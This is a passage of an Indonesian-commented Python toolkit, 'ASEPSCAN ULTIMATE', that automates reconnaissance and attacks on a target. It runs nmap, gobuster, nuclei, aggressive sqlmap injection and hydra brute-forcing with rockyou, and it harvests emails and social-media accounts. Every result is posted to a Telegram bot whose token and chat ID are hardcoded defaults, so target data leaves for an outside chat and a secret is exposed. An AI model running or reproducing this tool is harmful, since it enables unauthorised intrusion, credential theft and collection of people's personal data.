import os
import time
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import socket
import dns.resolver
import re
import html
import subprocess
import sys
import shutil
import concurrent.futures
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, BarColumn, TimeRemainingColumn, SpinnerColumn
from rich.status import Status
from rich.markdown import Markdown

# Tambahkan go bin path ke PATH agar tool go bisa terdeteksi
go_bin_path = os.path.expanduser("~/go/bin")
if go_bin_path not in os.environ.get("PATH", ""):
    os.environ["PATH"] = os.environ.get("PATH", "") + os.pathsep + go_bin_path

# Konfigurasi Telegram (gunakan environment variable)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8127930072:AAHwbMBROwSrXSRFTPL4RgdNunzrKqgisHU")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "5731047913")

console = Console()

def clean_ansi_codes(text):
    """Hapus kode ANSI dan escape karakter HTML dari teks"""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    clean_text = ansi_escape.sub('', text)
    return html.escape(clean_text)

def send_to_telegram(message):
    """Kirim hasil scan ke Telegram"""
    try:
        if TELEGRAM_TOKEN == "your_default_token":
            return False

        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)

        if response.status_code != 200:
            console.print(f"[red]Gagal kirim ke Telegram: {response.text}[/red]")
            return False
        return True
    except Exception as e:
        console.print(f"[red]Error Telegram: {str(e)}[/red]")
        return False

def banner():
    ascii_art = """
     █████╗ ███████╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗
    ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
    ███████║███████╗█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║
    ██╔══██║╚════██║██╔══╝  ██╔═══╝ ╚════██║██║     ██╔══██║██║╚██╗██║
    ██║  ██║███████║███████╗██║     ███████║╚██████╗██║  ██║██║ ╚████║
    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
    """
    console.print(Panel.fit(ascii_art, title="ASEPSCAN ULTIMATE v10.0", style="bold red"))
    console.print(f"[bold red]Advanced Penetration Toolkit with FAST/COMPLETE Modes[/bold red]\n")
    console.print(Panel.fit(
        "[bold yellow]PERINGATAN:[/bold yellow] Gunakan hanya pada sistem Anda sendiri atau dengan izin tertulis! "
        "Penyalahgunaan dapat mengakibatkan tuntutan hukum pidana.",
        style="red"
    ))

def check_tool(tool_name):
    return shutil.which(tool_name) is not None

def get_system_install_command(package_name):
    is_termux = 'com.termux' in os.environ.get('PREFIX', '') or os.path.exists('/data/data/com.termux/files/usr/bin')
    if is_termux:
        return f"pkg install {package_name} -y"
    else:
        # Check package managers
        if shutil.which("apt") is not None:
            return f"sudo apt install {package_name} -y"
        elif shutil.which("pacman") is not None:
            return f"sudo pacman -S {package_name} --noconfirm"
        elif shutil.which("dnf") is not None:
            return f"sudo dnf install {package_name} -y"
        else:
            return None

def install_tool(tool_name, install_command):
    if not install_command:
        console.print(f"[red]Gagal install {tool_name}: Package manager tidak didukung. Silakan install manual.[/red]")
        return False
    console.print(f"[yellow]⏳ Menginstall {tool_name}...[/yellow]")
    try:
        if "go install" in install_command:
            # check if go is installed, if not, try to install it first
            if shutil.which("go") is None:
                go_install_cmd = get_system_install_command("golang")
                if go_install_cmd:
                    console.print(f"[yellow]⏳ Go compiler tidak ditemukan, menginstall Go dahulu...[/yellow]")
                    subprocess.run(go_install_cmd, shell=True)
                else:
                    console.print(f"[red]Go compiler tidak ditemukan dan tidak bisa diinstall otomatis. Silakan install Go terlebih dahulu.[/red]")
                    return False
            
            result = subprocess.run(install_command.split(), capture_output=True, text=True)
            if result.returncode == 0:
                go_path = os.path.expanduser("~/go/bin")
                if go_path not in os.environ["PATH"]:
                    os.environ["PATH"] += os.pathsep + go_path
                return True
            else:
                console.print(f"[red]Gagal install {tool_name}: {result.stderr or result.stdout}[/red]")
                return False
        else:
            result = subprocess.run(install_command, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                # Mitigation for PEP 668: externally-managed-environment
                if "pip install" in install_command and "externally-managed-environment" in result.stderr:
                    console.print("[yellow]⚠️ Terdeteksi externally-managed-environment, mencoba dengan --break-system-packages...[/yellow]")
                    fixed_cmd = install_command.replace("pip install", "pip install --break-system-packages")
                    result = subprocess.run(fixed_cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
    except Exception as e:
        console.print(f"[red]Error install {tool_name}: {str(e)}[/red]")
        return False

def ensure_tool(tool_name, install_command):
    if check_tool(tool_name):
        return True
    return install_tool(tool_name, install_command)

def ensure_sqlmap():
    # 1. Cek apakah perintah 'sqlmap' ada di PATH
    if shutil.which("sqlmap") is not None:
        return ["sqlmap"]
    
    # 2. Cek path umum untuk sqlmap.py
    candidate_paths = [
        os.path.expanduser("~/sqlmap/sqlmap.py"),
        "./sqlmap/sqlmap.py",
        "./sqlmap.py",
        os.path.expanduser("~/sqlmap.py")
    ]
    for path in candidate_paths:
        if os.path.exists(path):
            return ["python3", path]
            
    # 3. Clone sqlmap jika tidak ditemukan
    console.print("[yellow]⏳ sqlmap tidak ditemukan di sistem. Mencoba meng-clone dari github...[/yellow]")
    sqlmap_dir = os.path.expanduser("~/sqlmap")
    try:
        subprocess.run(["git", "clone", "--depth", "1", "https://github.com/sqlmapproject/sqlmap.git", sqlmap_dir], check=True)
        if os.path.exists(os.path.join(sqlmap_dir, "sqlmap.py")):
            return ["python3", os.path.join(sqlmap_dir, "sqlmap.py")]
    except Exception as e:
        console.print(f"[red]Gagal clone sqlmap: {str(e)}[/red]")
        
    return None

def detect_protocol(target):
    try:
        response = requests.head(f"https://{target}", timeout=5, verify=False, allow_redirects=True)
        if response.status_code < 400:
            return "https"
    except:
        pass
    return "http"

def whois_lookup(target, mode="cepat"):
    if not ensure_tool("whois", get_system_install_command("whois")):
        return

    console.print("[yellow]⏳ Ngecek WHOIS...[/yellow]")

    command = ["whois", "-H", target] if mode == "cepat" else ["whois", target]

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        output = result.stdout if result.returncode == 0 else result.stderr

        console.print(Panel.fit(output, title="Hasil WHOIS", style="green"))
        telegram_msg = f"<b>🔍 HASIL WHOIS UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def whatweb_scan(target, mode="cepat"):
    if not ensure_tool("whatweb", get_system_install_command("whatweb")):
        return

    console.print("[yellow]⏳ Ngecek WhatWeb...[/yellow]")

    command = ["whatweb", "-v", target] if mode == "lengkap" else ["whatweb", target]

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        output = result.stdout if result.returncode == 0 else result.stderr

        console.print(Panel.fit(output, title="Hasil WhatWeb", style="green"))
        telegram_msg = f"<b>🌐 HASIL WHATWEB UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def nmap_scan(target, mode="cepat"):
    if not ensure_tool("nmap", get_system_install_command("nmap")):
        return

    console.print(f"[yellow]⏳ Ngecek Nmap ({mode})...[/yellow]")

    if mode == "lengkap":
        scan_args = ["-p-", "-sV", "-O", "-T4"]
    else:
        scan_args = ["-T4", "--top-ports", "100"]

    command = ["nmap"] + scan_args + [target]

    try:
        with Status("[bold green]Scanning...", spinner="dots") as status:
            result = subprocess.run(command, capture_output=True, text=True, timeout=3600)
        output = result.stdout if result.returncode == 0 else result.stderr

        console.print(Panel.fit(output, title="Hasil Nmap", style="green"))
        telegram_msg = f"<b>🔦 HASIL NMAP ({mode}) UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def subdomain_checker(target, mode="cepat"):
    if not ensure_tool("assetfinder", "go install github.com/tomnomnom/assetfinder@latest"):
        return

    console.print("[yellow]⏳ Nyari subdomain...[/yellow]")

    try:
        result_asset = subprocess.run(
            ["assetfinder", "--subs-only", target],
            capture_output=True,
            text=True,
            timeout=300
        )
        subdomains = result_asset.stdout.splitlines()

        if mode == "lengkap" and ensure_tool("httprobe", "go install github.com/tomnomnom/httprobe@latest"):
            console.print("[cyan]Verifikasi subdomain aktif...[/cyan]")
            with subprocess.Popen(["httprobe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True) as probe:
                probe.stdin.write("\n".join(subdomains))
                probe.stdin.close()
                live_subs = probe.stdout.read().splitlines()
            subdomains = live_subs

        output = "\n".join(subdomains) if subdomains else "Gak nemu subdomain."

        console.print(Panel.fit(output, title="Subdomain", style="green"))
        telegram_msg = f"<b>🌍 SUBDOMAIN UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def gobuster_scan(target, mode="cepat"):
    if not ensure_tool("gobuster", "go install github.com/OJ/gobuster/v3@latest"):
        return

    protocol = detect_protocol(target)
    wordlist_dir = os.path.expanduser("~/.wordlists")
    os.makedirs(wordlist_dir, exist_ok=True)

    if mode == "lengkap":
        wordlist_path = os.path.join(wordlist_dir, "directory-list-2.3-big.txt")
        if not os.path.exists(wordlist_path):
            with Status("Downloading...", spinner="dots"):
                subprocess.run(
                    ["wget", "-O", wordlist_path, "https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/directory-list-2.3-big.txt"],
                    check=True
                )
        threads = 50
        timeout = 30
    else:
        wordlist_path = os.path.join(wordlist_dir, "quickhits.txt")
        if not os.path.exists(wordlist_path):
            subprocess.run(
                ["wget", "-O", wordlist_path, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/quickhits.txt"],
                check=True
            )
        threads = 100
        timeout = 10

    command = [
        "gobuster", "dir",
        "-u", f"{protocol}://{target}",
        "-w", wordlist_path,
        "-t", str(threads),
        "--timeout", f"{timeout}s",
        "-b", "404,403"
    ]

    try:
        start_time = time.time()
        result = subprocess.run(command, capture_output=True, text=True, timeout=1800)
        end_time = time.time()
        duration = end_time - start_time

        if result.returncode != 0:
            console.print(f"[red]Gobuster error: {result.stderr}[/red]")
            return

        output = result.stdout

        console.print(f"[green]✓ Gobuster selesai dalam {duration:.2f} detik[/green]")

        if not output.strip():
            output = "Gak nemu direktori menarik"
            console.print(Panel.fit(output, title="Hasil Gobuster", style="green"))
            telegram_msg = f"<b>📂 HASIL GOBUSTER UNTUK {target}</b>\n{output}"
        else:
            console.print(Panel.fit(output, title="Hasil Gobuster", style="green"))
            telegram_msg = f"<b>📂 HASIL GOBUSTER UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"

        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def cek_header(target, mode="cepat"):
    console.print("[yellow]⏳ Ngecek header HTTP...[/yellow]")
    protocol = detect_protocol(target)

    urls = [f"{protocol}://{target}"]
    if mode == "lengkap":
        urls.extend([
            f"{protocol}://{target}/admin",
            f"{protocol}://{target}/wp-admin",
            f"{protocol}://{target}/login"
        ])

    results = []
    for url in urls:
        try:
            response = requests.head(url, timeout=5, allow_redirects=True)
            header_text = f"URL: {url}\nStatus: {response.status_code}\n"
            for key, value in response.headers.items():
                header_text += f"{key}: {value}\n"
            results.append(header_text + "\n")
        except Exception as e:
            results.append(f"Error pada {url}: {str(e)}\n")

    panel_text = "\n".join(results) if results else "Server gak ngasih respons."

    console.print(Panel.fit(panel_text, title="Header HTTP", style="green"))
    telegram_msg = f"<b>📋 HEADER HTTP UNTUK {target}</b>\n<pre>{clean_ansi_codes(panel_text)}</pre>"
    send_to_telegram(telegram_msg)

def waf_detection(target, mode="cepat"):
    if not ensure_tool("wafw00f", "pip install wafw00f"):
        return

    console.print("[yellow]⏳ Ngecek WAF...[/yellow]")

    command = ["wafw00f", "-a", target] if mode == "lengkap" else ["wafw00f", target]

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=300)
        output = result.stdout if result.returncode == 0 else result.stderr

        console.print(Panel.fit(output.strip(), title="Deteksi WAF", style="green"))
        telegram_msg = f"<b>🛡️ HASIL DETEKSI WAF UNTUK {target}</b>\n<pre>{clean_ansi_codes(output) }</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def screenshot_web(target, mode="cepat"):
    if not ensure_tool("webscreenshot", "pip install webscreenshot"):
        return

    protocol = detect_protocol(target)
    outdir = f"screenshot_{target.replace('.', '_')}"

    urls = [f"{protocol}://{target}"]
    if mode == "lengkap":
        urls.extend([
            f"{protocol}://{target}/admin",
            f"{protocol}://{target}/wp-admin",
            f"{protocol}://{target}/login",
            f"{protocol}://{target}/contact"
        ])

    try:
        for url in urls:
            subprocess.run(
                ["webscreenshot", "-o", outdir, url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=30
            )

        console.print(f"[green]✓ Screenshot disimpen di: [bold]{outdir}[/bold][/green]")
        telegram_msg = f"<b>🖼️ SCREENSHOT UNTUK {target}</b>\nScreenshot berhasil disimpan di folde r: {outdir}"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def userrecon_scan(username, mode="cepat"):
    console.print(f"[yellow]⏳ Mencari akun [bold]{username}[/bold] di berbagai platform...[/yellow]")

    platforms = {
        "Facebook": f"https://www.facebook.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}",
        "Twitter": f"https://twitter.com/{username}",
        "LinkedIn": f"https://www.linkedin.com/in/{username}",
        "TikTok": f"https://www.tiktok.com/@{username}",
        "YouTube": f"https://www.youtube.com/@{username}",
        "Pinterest": f"https://www.pinterest.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "GitLab": f"https://gitlab.com/{username}",
        "Reddit": f"https://www.reddit.com/user/{username}",
        "Twitch": f"https://www.twitch.tv/{username}",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "Steam": f"https://steamcommunity.com/id/{username}",
        "Vimeo": f"https://vimeo.com/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
        "Medium": f"https://medium.com/@{username}",
        "DeviantArt": f"https://{username}.deviantart.com",
        "VK": f"https://vk.com/{username}",
        "Quora": f"https://www.quora.com/profile/{username}"
    }

    if mode == "cepat":
        quick_platforms = ["Facebook", "Instagram", "Twitter", "LinkedIn", "GitHub"]
        platforms = {k: v for k, v in platforms.items() if k in quick_platforms}

    results = []
    telegram_results = []

    with Progress(SpinnerColumn(), transient=True) as progress:
        task = progress.add_task("[cyan]Cek platform...", total=len(platforms))

        for platform, url in platforms.items():
            progress.update(task, advance=1, description=f"[cyan]Cek {platform}...")

            try:
                response = requests.head(url, timeout=5, allow_redirects=True)
                status = response.status_code

                if status == 200:
                    results.append(f"[green]✓ [bold]{platform}[/bold]: Ditemukan ({url})")
                    telegram_results.append(f"✅ {platform}: Ditemukan (<a href='{url}'>{url}</a>)")
                elif status == 404:
                    results.append(f"[red]✗ [bold]{platform}[/bold]: Tidak ditemukan")
                    telegram_results.append(f"❌ {platform}: Tidak ditemukan")
                else:
                    results.append(f"[yellow]? [bold]{platform}[/bold]: Status {status} ({url})")
                    telegram_results.append(f"❓ {platform}: Status {status} (<a href='{url}'>{url}</a>)")

            except:
                results.append(f"[yellow]? [bold]{platform}[/bold]: Gagal koneksi")
                telegram_results.append(f"❓ {platform}: Gagal koneksi")

    console.print(Panel.fit("\n".join(results), title=f"Hasil UserRecon: {username}", style="cyan"))
    telegram_msg = f"<b>👤 HASIL USER RECON UNTUK {username}</b>\n\n" + "\n".join(telegram_results)
    send_to_telegram(telegram_msg)

def dns_recon(target, mode="cepat"):
    console.print(f"[yellow]⏳ Melakukan DNS Recon untuk [bold]{target}[/bold]...[/yellow]")

    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    if mode == "lengkap":
        record_types.extend(['PTR', 'SRV', 'DNSKEY', 'DS', 'RRSIG'])

    results = []
    telegram_results = []

    try:
        for rtype in record_types:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8', '1.1.1.1']
                answers = resolver.resolve(target, rtype)
                results.append(f"[bold magenta]╔═ {rtype} Records:[/bold magenta]")
                telegram_results.append(f"<b>🔗 {rtype} Records:</b>")
                for rdata in answers:
                    results.append(f"[bold cyan]║[/bold cyan] {rdata.to_text()}")
                    telegram_results.append(f"• {rdata.to_text()}")
            except dns.resolver.NoAnswer:
                pass
            except Exception as e:
                results.append(f"[bold yellow]║ Error: {str(e)}[/bold yellow]")
                telegram_results.append(f"⚠️ Error: {str(e)}")
    except Exception as e:
        results.append(f"[bold red]║ Error: {str(e)}[/bold red]")
        telegram_results.append(f"❌ Error: {str(e)}")

    if results:
        console.print(Panel.fit("\n".join(results), title="Hasil DNS Recon", style="green"))
    else:
        console.print(Panel.fit("Tidak ada record DNS yang ditemukan", title="Hasil DNS Recon", style="yellow"))

    if telegram_results:
        telegram_msg = f"<b>📡 HASIL DNS RECON UNTUK {target}</b>\n\n" + "\n".join(telegram_results)
    else:
        telegram_msg = f"<b>📡 HASIL DNS RECON UNTUK {target}</b>\nTidak ada record DNS yang ditemukan"

    send_to_telegram(telegram_msg)

def email_harvester(target, mode="cepat"):
    console.print(f"[yellow]⏳ Mencari email terkait [bold]{target}[/bold]...[/yellow]")

    sources = [
        "https://www.google.com/search?q=%40{}",
        "https://www.bing.com/search?q=%40{}",
        "https://search.yahoo.com/search?p=%40{}"
    ]

    if mode == "lengkap":
        sources.extend([
            "https://www.baidu.com/s?wd=%40{}",
            "https://yandex.com/search/?text=%40{}",
            "https://duckduckgo.com/?q=%40{}"
        ])

    emails = set()

    with Progress(transient=True) as progress:
        task = progress.add_task("[cyan]Mencari email...", total=len(sources))

        for url_template in sources:
            progress.update(task, advance=1)
            try:
                url = url_template.format(target)
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
                response = requests.get(url, headers=headers, timeout=10)
                found_emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text)

                for email in found_emails:
                    if target in email.split('@')[1]:
                        emails.add(email)
            except:
                continue

    if emails:
        email_list = "\n".join([f"[green]• {email}[/green]" for email in emails])
        console.print(Panel.fit(email_list, title="Email Ditemukan", style="green"))
    else:
        console.print(Panel.fit("Tidak ditemukan email terkait domain ini", title="Email Harvester", style="yellow"))

    if emails:
        email_list = "\n".join([f"• {email}" for email in emails])
        telegram_msg = f"<b>✉️ EMAIL TERKAIT {target}</b>\n\n{email_list}"
    else:
        telegram_msg = f"<b>✉️ EMAIL TERKAIT {target}</b>\nTidak ditemukan email"

    send_to_telegram(telegram_msg)

def cloud_detector(target, mode="cepat"):
    console.print(f"[yellow]⏳ Mendeteksi layanan cloud untuk [bold]{target}[/bold]...[/yellow]")

    cloud_indicators = {
        "Cloudflare": ["cloudflare", "cf-ray"],
        "AWS": ["aws", "amazon web services", "x-amz-cf-id"],
        "Google Cloud": ["google cloud", "gcp", "googleusercontent"],
        "Azure": ["azure", "microsoft", "x-azure-ref"],
        "Akamai": ["akamai", "x-akamai"],
        "CloudFront": ["cloudfront", "x-amz-cf-id"],
        "Fastly": ["fastly", "x-fastly"]
    }

    if mode == "lengkap":
        try:
            answers = dns.resolver.resolve(target, 'CNAME')
            for rdata in answers:
                if "cloudfront" in rdata.target.to_text().lower():
                    cloud_indicators["CloudFront"].append(rdata.target.to_text())
                elif "azure" in rdata.target.to_text().lower():
                    cloud_indicators["Azure"].append(rdata.target.to_text())
        except:
            pass

    protocol = detect_protocol(target)
    results = []
    telegram_results = []

    try:
        response = requests.get(f"{protocol}://{target}", timeout=10)
        headers = response.headers

        for cloud, indicators in cloud_indicators.items():
            detected = False
            for indicator in indicators:
                if indicator in response.text.lower() or any(indicator in value.lower() for value in headers.values()):
                    results.append(f"[green]✓ {cloud}[/green]")
                    telegram_results.append(f"✅ {cloud}")
                    detected = True
                    break
            if not detected:
                results.append(f"[red]✗ {cloud}[/red]")
                telegram_results.append(f"❌ {cloud}")
    except Exception as e:
        results.append(f"[red]Error: {str(e)}[/red]")
        telegram_results.append(f"⚠️ Error: {str(e)}")

    if results:
        console.print(Panel.fit("\n".join(results), title="Hasil Cloud Detector", style="cyan"))
    else:
        console.print(Panel.fit("Tidak terdeteksi layanan cloud", title="Cloud Detector", style="yellow"))

    if telegram_results:
        telegram_msg = f"<b>☁️ HASIL CLOUD DETECTOR UNTUK {target}</b>\n\n" + "\n".join(telegram_results)
    else:
        telegram_msg = f"<b>☁️ HASIL CLOUD DETECTOR UNTUK {target}</b>\nTidak terdeteksi layanan cloud"

    send_to_telegram(telegram_msg)

def cms_detector(target, mode="cepat"):
    console.print(f"[yellow]⏳ Mendeteksi CMS untuk [bold]{target}[/bold]...[/yellow]")

    cms_indicators = {
        "WordPress": [
            "wp-content", "wp-includes", "wordpress", "wp-json",
            "/wp-admin/", "wp-login.php", "generator\" content=\"WordPress"
        ],
        "Joomla": [
            "joomla", "media/system/js", "index.php?option=com_",
            "content=\"Joomla", "/templates/", "joomla_"
        ],
        "Drupal": [
            "drupal", "sites/all/", "core/assets", "Drupal.settings",
            "content=\"Drupal", "/sites/default/files"
        ],
        "Magento": [
            "magento", "/js/mage/", "skin/frontend/", "Magento_",
            "customer/account/", "catalog/product_"
        ],
        "Shopify": [
            "shopify", "cdn.shopify.com", "shopify.shop", "checkout.shopify.com",
            "Shopify.theme", "window.Shopify"
        ],
        "OpenCart": [
            "opencart", "catalog/view/theme", "index.php?route=",
            "system/storage/", "Powered By OpenCart"
        ],
        "PrestaShop": [
            "prestashop", "modules/", "themes/", "prestashop.css",
            "content=\"PrestaShop", "shop-default"
        ]
    }

    protocol = detect_protocol(target)
    url = f"{protocol}://{target}"
    detected_cms = None

    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        content = response.text.lower()
        headers = response.headers

        if 'x-powered-by' in headers:
            for cms, indicators in cms_indicators.items():
                if cms.lower() in headers['x-powered-by'].lower():
                    detected_cms = cms
                    break

        if not detected_cms:
            generator_pattern = re.compile(r'<meta name="generator" content="(.*?)"', re.IGNORECASE)
            generator_match = generator_pattern.search(response.text)
            if generator_match:
                generator_content = generator_match.group(1).lower()
                for cms, indicators in cms_indicators.items():
                    if cms.lower() in generator_content:
                        detected_cms = cms
                        break

        if not detected_cms:
            for cms, indicators in cms_indicators.items():
                for indicator in indicators:
                    if indicator.lower() in content:
                        detected_cms = cms
                        break
                if detected_cms:
                    break

        if detected_cms and mode == "lengkap":
            version = "Unknown"
            if detected_cms == "WordPress":
                version_pattern = re.compile(r'content="WordPress (\d+\.\d+\.\d+)')
                version_match = version_pattern.search(response.text)
                if version_match:
                    version = version_match.group(1)
            detected_cms += f" v{version}"

        if detected_cms:
            result = f"[green]✓ {detected_cms}[/green]"
            telegram_msg = f"✅ {detected_cms}"
        else:
            result = "[red]✗ Tidak terdeteksi CMS populer[/red]"
            telegram_msg = "❌ Tidak terdeteksi CMS populer"

    except Exception as e:
        result = f"[red]Error: {str(e)}[/red]"
        telegram_msg = f"⚠️ Error: {str(e)}"

    console.print(Panel.fit(result, title="Hasil CMS Detector", style="green" if detected_cms else "yellow"))
    send_to_telegram(f"<b>🖥️ CMS TERDETEKSI UNTUK {target}</b>\n{telegram_msg}")

def port_scanner(target, mode="cepat"):
    console.print(f"[yellow]⏳ Scanning port untuk [bold]{target}[/bold]...[/yellow]")

    if mode == "lengkap":
        ports = range(1, 65536)
        total_ports = 65535
    else:
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                        993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        ports = common_ports
        total_ports = len(common_ports)

    open_ports = []

    with Progress(SpinnerColumn(), BarColumn(), TimeRemainingColumn(), transient=True) as progress:
        task = progress.add_task("[cyan]Scanning port...", total=total_ports)

        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            return port, result == 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            for future in concurrent.futures.as_completed(futures):
                port, is_open = future.result()
                progress.update(task, advance=1)
                if is_open:
                    open_ports.append(port)

    if open_ports:
        ports_list = "\n".join([f"[green]• Port {port} terbuka[/green]" for port in open_ports])
        console.print(Panel.fit(ports_list, title="Port Terbuka", style="green"))
    else:
        console.print(Panel.fit("Tidak ada port terbuka yang ditemukan", title="Port Scanner", style="yellow"))

    if open_ports:
        ports_list = "\n".join([f"• Port {port} terbuka" for port in open_ports])
        telegram_msg = f"<b>🚪 PORT TERBUKA UNTUK {target}</b>\n\n{ports_list}"
    else:
        telegram_msg = f"<b>🚪 PORT TERBUKA UNTUK {target}</b>\nTidak ada port terbuka yang ditemukan"

    send_to_telegram(telegram_msg)

def nuclei_scan(target, mode="cepat"):
    if not ensure_tool("nuclei", "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"):
        return

    subprocess.run(["nuclei", "-update-templates"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if mode == "cepat":
        command = ["nuclei", "-u", target, "-silent", "-severity", "critical,high", "-timeout", "5", "-rate-limit", "100"]
        timeout = 600
    else:
        command = ["nuclei", "-u", target, "-silent", "-timeout", "10"]
        timeout = 7200

    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
        output = result.stdout if result.returncode == 0 else result.stderr

        if not output.strip():
            output = "Tidak ditemukan kerentanan"

        console.print(Panel.fit(output, title="Nuclei Vulnerability Scan", style="red"))
        telegram_msg = f"<b>💀 HASIL VULN SCAN UNTUK {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def sqlmap_scan(target, mode="cepat"):
    sqlmap_cmd = ensure_sqlmap()
    if not sqlmap_cmd:
        console.print("[red]sqlmap tidak terinstall dan gagal di-clone secara otomatis.[/red]")
        return

    protocol = detect_protocol(target)
    url = f"{protocol}://{target}"

    if mode == "cepat":
        command = sqlmap_cmd + ["-u", url, "--batch", "--level=1", "--risk=1"]
    else:
        command = sqlmap_cmd + ["-u", url, "--batch", "--level=5", "--risk=3", "--crawl=10"]

    try:
        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1) as proc:

            vuln_points = []
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break
                if line:
                    console.print(line.strip())
                    if "Parameter:" in line and "Type:" in line:
                        parts = line.split()
                        if len(parts) >= 6:
                            param = parts[1]
                            vuln_type = parts[3]
                            vuln_points.append((param, vuln_type))

            if vuln_points:
                vuln_table = Table(title="SQL Injection Vulnerabilities", style="red")
                vuln_table.add_column("Parameter")
                vuln_table.add_column("Tipe")
                for param, vuln_type in vuln_points:
                    vuln_table.add_row(param, f"[bold red]{vuln_type}[/bold red]")

                console.print(vuln_table)
                telegram_msg = f"<b>💉 SQL INJECTION DITEMUKAN DI {target}</b>\n"
                for param, vuln_type in vuln_points:
                    telegram_msg += f"• {param} - {vuln_type}\n"
            else:
                console.print("[green]✓ Tidak ditemukan kerentanan SQL Injection[/green]")
                telegram_msg = f"<b>🛡️ Tidak ada SQL Injection di {target}</b>"

            send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def hydra_attack(target, service, mode="cepat"):
    if not ensure_tool("hydra", get_system_install_command("hydra")):
        return

    username_list = os.path.expanduser("~/.wordlists/usernames.txt")
    password_list = os.path.expanduser("~/.wordlists/passwords.txt")

    if not os.path.exists(username_list):
        subprocess.run(
            ["wget", "-O", username_list, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt"],
            check=True
        )

    if not os.path.exists(password_list):
        subprocess.run(
            ["wget", "-O", password_list, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"],
            check=True
        )

    if mode == "lengkap":
        password_list = os.path.expanduser("~/.wordlists/rockyou.txt")
        if not os.path.exists(password_list):
            subprocess.run(["wget", "https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz"], check=True)
            subprocess.run(["gunzip", "rockyou.txt.gz"], check=True)
            shutil.move("rockyou.txt", password_list)

    command = [
        "hydra",
        "-L", username_list,
        "-P", password_list,
        target,
        service,
        "-t", "4",
        "-vV"
    ]

    try:
        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1) as proc:

            found_creds = []
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break
                if line:
                    console.print(line.strip())
                    if "login:" in line and "password:" in line:
                        parts = line.split()
